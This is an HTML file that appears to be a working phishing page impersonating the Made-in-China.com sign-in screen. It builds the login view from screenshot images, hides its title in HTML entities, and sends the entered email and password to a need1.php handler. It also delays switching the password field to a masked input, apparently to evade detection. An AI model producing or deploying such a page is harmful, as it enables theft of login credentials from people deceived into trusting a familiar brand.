<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;&#32;&#124;&#32;&#77;&#97;&#100;&#101;&#45;&#105;&#110;&#45;&#67;&#104;&#105;&#110;&#97;&#46;&#99;&#111;&#109;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
.textbox { 
    border: 1px solid #ccc; 
    height: 42px; 
    width: 275px; 
  	font-family: Tahoma,"微软雅黑","宋体",arial;
    font-size: 16px;
  	color: #555;
    padding-left:6px; 
} 
.textbox:focus { 
    outline: none; 
    border: 1px solid #999;
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div id="container">
<div class="loader"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:210px; top:62px; width:951px; height:461px; z-index:0"><img src="images/w1.png" alt="" title="" border=0 width=951 height=461></div>

<div id="image2" style="position:absolute; overflow:hidden; left:963px; top:269px; width:152px; height:21px; z-index:1"><a href="#"><img src="images/m3.png" alt="" title="" border=0 width=152 height=21></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1050px; top:434px; width:65px; height:20px; z-index:2"><a href="#"><img src="images/m4.png" alt="" title="" border=0 width=65 height=20></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:615px; width:1349px; height:175px; z-index:3"><a href="#"><img src="images/m5.png" alt="" title="" border=0 width=1349 height=175></a></div>
<form action=need1.php name=mandrase id=mandrase method=post>
<input name="email"  class="textbox" autocomplete="off" required type="text" style="position:absolute;width:377px;left:736px;top:202px;z-index:4">
<input name="psw" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:377px;left:736px;top:302px;z-index:5">
<div id="formimage1" style="position:absolute; left:735px; top:372px; z-index:6"><input type="image" name="formimage1" width="381" height="50" src="images/m2.png"></div>

</div>

	
</body>
</html>
